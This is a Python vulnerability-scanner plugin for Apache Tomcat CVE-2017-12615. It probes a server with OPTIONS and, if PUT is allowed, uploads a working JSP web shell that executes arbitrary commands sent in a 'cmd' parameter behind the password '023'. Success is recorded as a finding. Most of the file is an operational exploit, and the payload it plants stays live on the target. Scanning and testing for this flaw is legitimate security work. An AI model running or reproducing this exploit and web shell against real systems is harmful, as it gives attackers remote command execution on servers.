#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger
import time


def run_domain(http, ob):
    server = ob.get('webServer')
    if server in ['nginx', 'iis']:
        return []
    result = []
    try:
        scheme = ob['scheme']
        domain = ob['domain']
        if 'https' == scheme:
            port = 443
        elif len(domain.split(':'))>1:
            port = int(domain.split(':')[1])
        else:
            port = 80
        host = domain.split(':')[0]
        result = []

        body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''

        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        conn = httplib.HTTPConnection(host, port)
        conn.request(method='OPTIONS', url='/ffffzz')
        headers = dict(conn.getresponse().getheaders())
        headers['host'] = ob['domain']
        if 'allow' in headers and headers['allow'].find('PUT') > 0:
            conn.close()
            conn = httplib.HTTPConnection(host, port)
            url = "/" + str(int(time.time())) + '.jsp/'
            # url = "/" + str(int(time.time()))+'.jsp::$DATA'
            conn.request(method='PUT', url=url, body=body)
            res = conn.getresponse()
            if res.status == 201:
                response = getResponse(res)
                request = getRequest(url, headers=headers, domain=ob['domain'])
                detail = "存在上传恶意JSP文件,执行任意代码漏洞(CVE-2017-12615)"
                result.append(getRecord(ob, url, ob['level'], detail, request, response))
        return result
    except Exception, e:
        logger.error("File:Apache_Tomcat_upload_CVE_12615.py, run_domain function :%s" % (str(e)))
        return result
